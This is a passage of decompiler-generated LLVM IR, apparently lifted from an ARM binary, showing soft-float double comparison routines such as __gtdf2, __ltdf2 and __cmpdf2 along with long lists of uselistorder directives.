  %v0_1d3fc = phi i1 [ false, %dec_label_pc_1d3f4._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1d3fc, i32 ptrtoint (i32* @global_var_1d124.1399 to i32))
  %v0_1d400 = load i32, i32* @r0, align 4
  %v1_1d400 = load i32, i32* @r1, align 4
  %v3_1d400 = mul i32 %v1_1d400, 2
  %v4_1d400 = or i32 %v3_1d400, %v0_1d400
  store i32 %v4_1d400, i32* %r4.global-to-local, align 4
  %v1_1d404 = icmp ne i32 %v4_1d400, 0
  call void @__pseudo_cond_branch(i1 %v1_1d404, i32 ptrtoint (i32* @global_var_1d1dc.1397 to i32))
  store i32 %v4_1d408.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1d40c = icmp ne i32 %v4_1d408.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1d40c, i32 ptrtoint (i32* @global_var_1d18c.1398 to i32))
  %v0_1d410 = load i32, i32* @r0, align 4
  %v1_1d410 = load i32, i32* @r1, align 4
  %v2_1d410 = call i32 @function_1d1f8(i32 %v0_1d410, i32 %v1_1d410)
  store i32 %v2_1d410, i32* %r0.global-to-local, align 4
  ret i32 %v2_1d410

; uselistorder directives
  uselistorder i32 %v5_1d3f8, { 1, 0, 2 }
  uselistorder i32 %v1_1d3b4, { 1, 0 }
  uselistorder i32 %v1_1d394, { 1, 0 }
  uselistorder i32 %v0_1d394, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1d37c, { 2, 0, 1 }
  uselistorder i32 %v6_1d378, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1d370, { 1, 0 }
  uselistorder i32 %v2_1d358, { 1, 0, 2 }
  uselistorder i32 %v1_1d358, { 1, 0, 2 }
  uselistorder i32 %v1_1d354, { 1, 0, 2 }
  uselistorder i32 %v0_1d354, { 1, 0, 2 }
  uselistorder i1 %v7_1d348, { 1, 0 }
  uselistorder i32 %v2_1d32c, { 1, 0 }
  uselistorder i32 %v3_1d318, { 2, 1, 0 }
  uselistorder i32 %v3_1d30c, { 0, 2, 1 }
  uselistorder i32 %v5_1d308, { 2, 0, 1 }
  uselistorder i32 %v6_1d2f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1d2e4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1d2e0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1d2ec, { 0, 2, 1 }
  uselistorder i32 %v1_1d2f8, { 1, 0 }
  uselistorder i32 %v6_1d2dc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1d2c8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1d2c4, { 0, 2, 1 }
  uselistorder i32 %v0_1d2d0, { 0, 2, 1 }
  uselistorder i32 %v1_1d2dc, { 1, 0 }
  uselistorder i32 %v6_1d2c0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1d2ac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1d2b4, { 0, 2, 1 }
  uselistorder i32 %v1_1d2c0, { 1, 0 }
  uselistorder i32 %v3_1d2a4, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1d298, { 1, 2, 0 }
  uselistorder i32 %v3_1d31813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1d31417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1d298, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1d2a4, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1d340.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1d284, { 1, 0 }
  uselistorder i32 %v0_1d288, { 1, 0 }
  uselistorder i32 %v3_1d274, { 1, 0 }
  uselistorder i1 %v1_1d268, { 1, 0 }
  uselistorder i32 %v3_1d258, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1d254, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1d24c, { 2, 1, 0 }
  uselistorder i32 %v5_1d248, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1d228, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1d218, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1d218, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1d214, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1d214, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1d208, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %ip.global-to-local, { 7, 5, 6, 8, 0, 1, 2, 3, 4, 10, 9 }
  uselistorder i32 (i32, i32)* @function_1d1f8, { 2, 1, 0 }
  uselistorder i32 ()* @function_1d064, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 11, 12, 3, 13, 1, 14, 15, 16, 5, 9, 10, 4, 8, 7, 6, 17 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 7, 5, 6, 8, 9, 25, 10, 11, 2, 12, 13, 29, 102, 103, 110, 112, 14, 113, 15, 116, 117, 41, 118, 120, 137, 138, 139, 140, 16, 141, 142, 125, 126, 79, 80, 64, 65, 66, 67, 114, 115, 60, 61, 62, 63, 111, 3, 143, 144, 145, 146, 33, 34, 35, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 127, 131, 132, 104, 105, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 128, 36, 92, 106, 107, 42, 43, 108, 109, 68, 69, 70, 30, 119, 37, 71, 149, 72, 121, 122, 123, 124, 152, 153, 0, 154, 155, 135, 27, 133, 134, 93, 94, 95, 96, 97, 98, 56, 129, 130, 73, 136, 17, 18, 26, 19, 20, 4, 21, 22, 31, 44, 45, 74, 75, 76, 77, 78, 46, 38, 39, 47, 99, 48, 40, 49, 100, 50, 57, 58, 51, 59, 101, 28, 32, 52, 147, 148, 23, 150, 53, 151, 24, 54, 55 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 65, 33, 6, 7, 22, 8, 135, 136, 143, 145, 146, 147, 148, 9, 149, 151, 152, 153, 154, 155, 34, 74, 50, 51, 66, 164, 165, 166, 167, 29, 94, 75, 76, 77, 78, 150, 144, 182, 183, 189, 238, 42, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 168, 95, 96, 97, 98, 99, 100, 101, 102, 103, 10, 43, 104, 40, 105, 106, 67, 107, 108, 169, 170, 171, 137, 138, 139, 140, 141, 142, 79, 80, 81, 82, 52, 256, 257, 35, 83, 11, 133, 185, 84, 85, 31, 190, 191, 192, 193, 194, 195, 196, 197, 12, 56, 198, 199, 200, 201, 202, 203, 204, 205, 13, 156, 157, 158, 159, 160, 161, 162, 163, 206, 207, 208, 209, 14, 210, 211, 15, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 229, 222, 223, 224, 225, 57, 24, 226, 227, 228, 58, 59, 16, 230, 231, 232, 233, 235, 236, 60, 17, 237, 18, 234, 177, 46, 47, 44, 45, 25, 26, 37, 38, 48, 258, 176, 172, 173, 109, 110, 68, 111, 112, 113, 114, 30, 115, 61, 62, 116, 117, 118, 49, 119, 120, 121, 122, 27, 28, 123, 124, 125, 63, 174, 175, 86, 178, 32, 179, 180, 181, 53, 69, 36, 19, 20, 23, 21, 87, 88, 89, 90, 91, 92, 54, 93, 126, 127, 128, 55, 129, 130, 131, 132, 70, 71, 72, 73, 41, 39, 134, 184, 186, 187, 188 }
  uselistorder i32 4, { 5, 6, 191, 269, 270, 192, 7, 8, 274, 275, 276, 277, 278, 71, 279, 280, 288, 290, 291, 103, 292, 293, 294, 83, 295, 298, 129, 299, 300, 301, 302, 303, 304, 9, 305, 130, 104, 306, 131, 0, 1, 132, 309, 331, 332, 106, 105, 333, 133, 134, 135, 136, 334, 335, 108, 336, 107, 337, 85, 228, 229, 230, 322, 323, 205, 206, 296, 297, 200, 201, 202, 203, 204, 289, 10, 338, 11, 339, 347, 281, 12, 13, 14, 265, 15, 16, 231, 17, 102, 97, 98, 18, 406, 99, 407, 88, 19, 20, 100, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 21, 425, 426, 427, 428, 429, 430, 87, 431, 432, 433, 434, 435, 436, 22, 23, 101, 437, 325, 109, 232, 233, 234, 235, 236, 237, 238, 239, 240, 84, 241, 242, 243, 244, 245, 324, 246, 137, 282, 283, 284, 285, 286, 287, 24, 207, 208, 209, 210, 25, 211, 438, 138, 110, 139, 439, 26, 440, 140, 198, 199, 350, 351, 352, 92, 353, 141, 27, 212, 142, 213, 143, 89, 214, 271, 144, 272, 273, 341, 342, 343, 344, 145, 146, 215, 147, 148, 216, 28, 217, 218, 86, 90, 356, 357, 358, 359, 360, 361, 149, 150, 29, 362, 363, 364, 365, 366, 367, 368, 369, 151, 354, 355, 310, 311, 312, 313, 314, 315, 316, 317, 318, 30, 319, 320, 321, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 152, 153, 154, 384, 385, 388, 391, 386, 387, 111, 155, 389, 72, 390, 392, 393, 394, 396, 156, 32, 31, 395, 157, 158, 159, 348, 326, 405, 33, 34, 35, 36, 2, 247, 37, 38, 160, 73, 39, 40, 219, 161, 41, 162, 163, 164, 165, 248, 249, 42, 250, 166, 251, 252, 253, 113, 254, 255, 112, 167, 256, 257, 258, 259, 260, 261, 74, 168, 262, 264, 169, 170, 263, 193, 327, 43, 328, 114, 329, 330, 307, 308, 397, 398, 194, 44, 45, 46, 47, 75, 48, 49, 50, 76, 51, 52, 171, 53, 220, 115, 221, 116, 222, 223, 224, 225, 226, 227, 54, 55, 172, 266, 93, 267, 94, 268, 56, 95, 96, 57, 77, 118, 195, 173, 174, 175, 176, 122, 177, 178, 120, 117, 196, 121, 58, 179, 119, 59, 197, 128, 60, 61, 91, 180, 123, 340, 181, 345, 182, 78, 79, 62, 63, 64, 125, 124, 126, 80, 183, 127, 65, 66, 81, 184, 346, 185, 82, 186, 187, 67, 349, 68, 69, 70, 399, 400, 401, 402, 403, 404, 188, 189, 190, 3, 4 }
  uselistorder i32 32, { 69, 70, 71, 72, 30, 31, 40, 59, 60, 33, 34, 73, 32, 41, 74, 75, 76, 77, 38, 78, 94, 96, 97, 108, 48, 61, 109, 98, 99, 62, 63, 64, 65, 95, 111, 42, 35, 79, 49, 22, 80, 81, 50, 51, 52, 37, 53, 100, 101, 44, 43, 102, 103, 1, 2, 4, 3, 112, 6, 5, 8, 7, 10, 9, 36, 106, 104, 105, 82, 83, 21, 84, 0, 54, 85, 86, 87, 88, 89, 90, 23, 66, 67, 107, 113, 55, 68, 56, 39, 91, 92, 93, 12, 11, 24, 45, 57, 110, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 46, 47, 58 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1, 10 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 85, 13, 14, 15, 84, 96, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 89, 56, 90, 57, 91, 58, 92, 93, 59, 60, 62, 61, 63, 64, 65, 66, 0, 87, 1, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 83, 94, 77, 82, 88, 95, 81, 78, 86, 79, 80 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 72, 73, 74, 75, 128, 129, 4, 130, 131, 132, 133, 149, 150, 151, 152, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 191, 192, 193, 194, 195, 196, 197, 209, 210, 211, 223, 224, 225, 226, 6, 5, 30, 31, 32, 33, 34, 35, 227, 228, 7, 229, 230, 231, 232, 233, 234, 235, 153, 154, 155, 156, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 134, 8, 135, 136, 76, 77, 78, 79, 9, 80, 81, 82, 83, 84, 85, 86, 137, 138, 139, 140, 10, 11, 141, 142, 143, 144, 145, 146, 147, 148, 36, 37, 38, 39, 40, 41, 42, 43, 12, 13, 14, 293, 294, 295, 296, 297, 298, 2, 299, 300, 25, 15, 26, 16, 27, 290, 291, 292, 44, 45, 46, 124, 125, 126, 127, 47, 48, 49, 50, 51, 52, 258, 262, 263, 264, 265, 259, 260, 261, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 266, 267, 268, 269, 270, 17, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 286, 288, 282, 283, 284, 285, 287, 289, 121, 122, 3, 123, 253, 254, 255, 256, 257, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 18, 212, 213, 55, 19, 56, 57, 214, 20, 215, 216, 98, 99, 21, 24, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 1, 115, 116, 22, 28, 100, 0, 101, 102, 69, 70, 71, 53, 54, 217, 218, 23, 219, 220, 221, 222, 117, 118, 119, 120, 182, 183, 184, 185, 186, 187, 188, 189, 190, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 250, 251, 252, 29 }
  uselistorder i32* @r5, { 124, 125, 126, 127, 128, 129, 130, 131, 132, 56, 57, 58, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 249, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 1, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 9, 290, 291, 292, 293, 294, 347, 302, 303, 304, 305, 306, 307, 308, 30, 309, 310, 311, 328, 364, 365, 10, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 11, 381, 380, 32, 382, 383, 384, 385, 386, 59, 60, 61, 62, 63, 64, 65, 387, 388, 389, 390, 391, 392, 397, 398, 393, 394, 395, 396, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 12, 155, 156, 66, 67, 68, 69, 70, 71, 72, 73, 74, 250, 251, 252, 253, 254, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 348, 349, 350, 351, 453, 454, 455, 227, 35, 228, 6, 229, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 329, 330, 33, 331, 230, 231, 232, 233, 157, 2, 158, 159, 160, 161, 162, 163, 234, 15, 235, 236, 13, 237, 238, 239, 240, 241, 242, 14, 243, 244, 245, 246, 247, 248, 75, 16, 76, 77, 78, 79, 36, 80, 17, 81, 82, 83, 84, 85, 468, 18, 469, 470, 480, 45, 46, 47, 48, 49, 50, 51, 471, 472, 473, 474, 475, 86, 87, 88, 89, 90, 91, 92, 93, 94, 213, 214, 215, 95, 96, 97, 98, 19, 20, 476, 477, 478, 479, 99, 100, 101, 102, 421, 422, 426, 427, 428, 429, 430, 423, 424, 425, 312, 313, 314, 21, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 8, 444, 445, 446, 447, 448, 22, 449, 450, 451, 452, 208, 209, 210, 211, 212, 411, 412, 413, 414, 38, 418, 419, 23, 420, 352, 24, 353, 354, 355, 164, 25, 165, 37, 166, 167, 168, 169, 170, 171, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 107, 108, 109, 110, 111, 342, 343, 344, 345, 346, 172, 173, 175, 174, 176, 177, 26, 178, 179, 180, 181, 182, 183, 184, 34, 185, 186, 190, 7, 191, 3, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 52, 53, 54, 187, 188, 189, 4, 27, 123, 104, 103, 31, 105, 106, 356, 357, 358, 359, 360, 361, 28, 362, 363, 202, 203, 204, 205, 206, 207, 295, 296, 297, 298, 299, 29, 300, 301, 112, 113, 5, 0, 114, 115, 116, 117, 118, 119, 120, 121, 122, 39, 40, 41, 42, 43, 44, 415, 416, 417, 55 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1d3f4, { 1, 0 }
  uselistorder label %dec_label_pc_1d3d8, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1d3a4, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1d294, { 1, 0 }
  uselistorder label %dec_label_pc_1d27c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1d418 = call i32 @function_1d428()
  ret i32 %v0_1d418
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1d420 = call i32 @function_1d428()
  ret i32 %v0_1d420

; uselistorder directives
  uselistorder i32 ()* @function_1d428, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1d424 = load i32, i32* @r0, align 4
  ret i32 %v0_1d424
}

define i32 @function_1d428() local_unnamed_addr {
dec_label_pc_1d428:
  %v0_1d428 = load i32, i32* @ip, align 4
  %v0_1d42c = load i32, i32* @r1, align 4
  %v2_1d42c = mul i32 %v0_1d42c, 2
  %v2_1d42c.off = add i32 %v2_1d42c, 4194303
  %tmp = icmp ult i32 %v2_1d42c.off, 2097152
  %v0_1d434 = load i32, i32* @r3, align 4
  %v2_1d434 = mul i32 %v0_1d434, 2
  br i1 %tmp, label %dec_label_pc_1d484, label %bb

bb:                                               ; preds = %dec_label_pc_1d428
  %v2_1d434.off = add i32 %v2_1d434, 4194303
  %tmp21 = icmp ult i32 %v2_1d434.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1d478, label %dec_label_pc_1d440

dec_label_pc_1d440:                               ; preds = %dec_label_pc_1d48c, %dec_label_pc_1d498, %bb
  %v0_1d440 = load i32, i32* @r0, align 4
  %v4_1d440 = or i32 %v0_1d440, %v2_1d42c
  %v6_1d440 = icmp eq i32 %v4_1d440, 0
  br i1 %v6_1d440, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1d440
  %v1_1d444 = load i32, i32* @r2, align 4
  %v5_1d444 = or i32 %v1_1d444, %v2_1d434
  %v7_1d444 = icmp eq i32 %v5_1d444, 0
  br i1 %v7_1d444, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1d440, %bb10
  %v5_1d448 = icmp eq i32 %v0_1d434, %v0_1d42c
  br i1 %v5_1d448, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1d44c.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1d44c = phi i32 [ %v2_1d44c.pre, %.thread..thread1_crit_edge ], [ %v1_1d444, %bb10 ]
  %v5_1d44c = icmp eq i32 %v2_1d44c, %v0_1d440
  br i1 %v5_1d44c, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1d454 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1d454 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1d454, i32 %v0_1d454)
  %v0_1d458 = load i32, i32* @r0, align 4
  %v0_1d45c = load i32, i32* @r1, align 4
  %v1_1d45c = load i32, i32* @r3, align 4
  %v2_1d45c = xor i32 %v1_1d45c, %v0_1d45c
  %v3_1d45c = icmp slt i32 %v2_1d45c, 0
  br i1 %v3_1d45c, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1d460 = icmp eq i32 %v0_1d45c, %v1_1d45c
  br i1 %v10_1d460, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1d464 = load i32, i32* @r2, align 4
  %v4_1d464 = icmp ult i32 %v0_1d458, %v2_1d464
  br i1 %v4_1d464, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1d460 = icmp ult i32 %v0_1d45c, %v1_1d45c
  br i1 %v4_1d460, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1d45c, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1d468 = and i32 %v1_1d45c, 1073741824
  %v3_1d468 = icmp eq i32 %v2_1d468, 0
  %v4_1d468 = ashr i32 %v1_1d45c, 31
  br i1 %v3_1d468, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1d46c.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1d468, %bb15 ]
  %v5_1d46c = sub nsw i32 -1, %v4_1d46c.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1d470 = phi i32 [ %v4_1d468, %bb15 ], [ %v5_1d46c, %.thread3 ]
  %v1_1d470 = or i32 %v0_1d470, 1
  ret i32 %v1_1d470

dec_label_pc_1d478:                               ; preds = %bb
  br label %dec_label_pc_1d48c

dec_label_pc_1d484:                               ; preds = %dec_label_pc_1d428
  %v0_1d484 = load i32, i32* @r0, align 4
  %v4_1d484 = mul i32 %v0_1d42c, 4096
  %v5_1d484 = or i32 %v0_1d484, %v4_1d484
  %v7_1d484 = icmp eq i32 %v5_1d484, 0
  br i1 %v7_1d484, label %dec_label_pc_1d484.dec_label_pc_1d48c_crit_edge, label %dec_label_pc_1d4a0

dec_label_pc_1d484.dec_label_pc_1d48c_crit_edge:  ; preds = %dec_label_pc_1d484
  %v2_1d434.off20 = add i32 %v2_1d434, 4194303
  %tmp22 = icmp ult i32 %v2_1d434.off20, 2097152
  br label %dec_label_pc_1d48c

dec_label_pc_1d48c:                               ; preds = %dec_label_pc_1d484.dec_label_pc_1d48c_crit_edge, %dec_label_pc_1d478
  %v3_1d490.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1d484.dec_label_pc_1d48c_crit_edge ], [ true, %dec_label_pc_1d478 ]
  br i1 %v3_1d490.pre-phi, label %dec_label_pc_1d498, label %dec_label_pc_1d440

dec_label_pc_1d498:                               ; preds = %dec_label_pc_1d48c
  %v0_1d498 = load i32, i32* @r2, align 4
  %v4_1d498 = mul i32 %v0_1d434, 4096
  %v5_1d498 = or i32 %v0_1d498, %v4_1d498
  %v7_1d498 = icmp eq i32 %v5_1d498, 0
  br i1 %v7_1d498, label %dec_label_pc_1d440, label %dec_label_pc_1d4a0

dec_label_pc_1d4a0:                               ; preds = %dec_label_pc_1d484, %dec_label_pc_1d498
  ret i32 %v0_1d428

; uselistorder directives
  uselistorder i32 %v4_1d468, { 1, 0 }
  uselistorder i32 %v1_1d45c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1d45c, { 2, 1, 0 }
  uselistorder i32 %v1_1d444, { 1, 0 }
  uselistorder i32 %v2_1d434, { 0, 2, 1 }
  uselistorder i32 %v0_1d434, { 1, 0, 2 }
  uselistorder i32 %v2_1d42c, { 1, 0 }
  uselistorder i32 %v0_1d42c, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9, 19 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 7, 5, 6, 8, 9, 10, 11, 31, 32, 33, 34, 35, 36, 37, 38, 39, 47, 48, 49, 50, 51, 59, 60, 61, 40, 12, 45, 66, 57, 41, 46, 71, 76, 74, 75, 73, 67, 68, 0, 43, 44, 69, 70, 72, 63, 64, 55, 14, 58, 15, 42, 1, 16, 56, 13, 52, 53, 54, 62, 65, 2, 3, 4 }
  uselistorder i32* @r3, { 25, 26, 16, 17, 27, 28, 7, 29, 30, 31, 32, 52, 53, 54, 55, 56, 57, 58, 59, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 2, 84, 6, 18, 20, 21, 86, 87, 108, 109, 3, 110, 111, 112, 4, 113, 114, 115, 5, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 0, 134, 135, 136, 137, 33, 34, 95, 96, 97, 35, 36, 37, 38, 39, 40, 19, 138, 144, 145, 146, 142, 60, 61, 62, 101, 102, 98, 63, 41, 42, 103, 104, 105, 106, 107, 9, 10, 11, 150, 147, 148, 149, 1, 151, 152, 153, 43, 44, 67, 22, 68, 69, 70, 71, 45, 46, 72, 143, 64, 65, 66, 139, 140, 141, 23, 24, 47, 48, 49, 50, 51, 12, 13, 14, 15, 88, 89, 90, 91, 92, 93, 94, 8, 99, 100 }
  uselistorder i32* @r1, { 72, 73, 11, 74, 75, 76, 77, 78, 18, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 28, 29, 19, 30, 31, 90, 1, 91, 92, 93, 94, 95, 96, 97, 10, 98, 99, 100, 101, 142, 20, 143, 144, 145, 148, 21, 22, 149, 150, 151, 152, 153, 154, 157, 158, 159, 160, 161, 164, 172, 173, 174, 175, 176, 177, 178, 7, 32, 33, 179, 180, 165, 102, 34, 36, 181, 182, 188, 189, 146, 134, 166, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 24, 147, 0, 35, 37, 26, 205, 27, 206, 207, 155, 156, 2, 162, 163, 3, 4, 200, 126, 12, 190, 191, 195, 194, 167, 168, 169, 114, 115, 116, 13, 14, 183, 184, 185, 186, 187, 5, 196, 197, 8, 127, 128, 198, 15, 23, 6, 117, 118, 119, 9, 120, 121, 122, 16, 170, 171, 123, 124, 25, 202, 203, 17, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 125, 129, 130, 131, 132, 133, 135, 136, 137, 138, 139, 140, 141, 192, 193, 199, 201, 204 }
  uselistorder i32* @ip, { 29, 18, 19, 20, 30, 31, 32, 33, 34, 35, 36, 74, 75, 76, 77, 78, 84, 85, 87, 88, 89, 90, 91, 92, 93, 94, 102, 2, 110, 109, 119, 120, 121, 122, 123, 124, 125, 126, 127, 129, 130, 128, 131, 11, 132, 12, 133, 134, 135, 136, 37, 38, 3, 39, 21, 86, 137, 138, 139, 153, 81, 82, 15, 41, 40, 7, 42, 43, 8, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 13, 205, 206, 207, 208, 209, 210, 211, 212, 213, 83, 44, 45, 46, 47, 48, 16, 214, 215, 71, 95, 96, 4, 97, 98, 99, 100, 101, 159, 160, 161, 162, 14, 163, 164, 165, 103, 104, 105, 106, 107, 108, 166, 167, 154, 114, 115, 49, 79, 80, 171, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 51, 50, 9, 219, 216, 217, 218, 10, 220, 111, 0, 23, 112, 5, 113, 24, 6, 25, 53, 54, 55, 56, 57, 58, 59, 60, 52, 61, 62, 63, 64, 65, 66, 67, 68, 1, 28, 22, 116, 117, 118, 69, 157, 158, 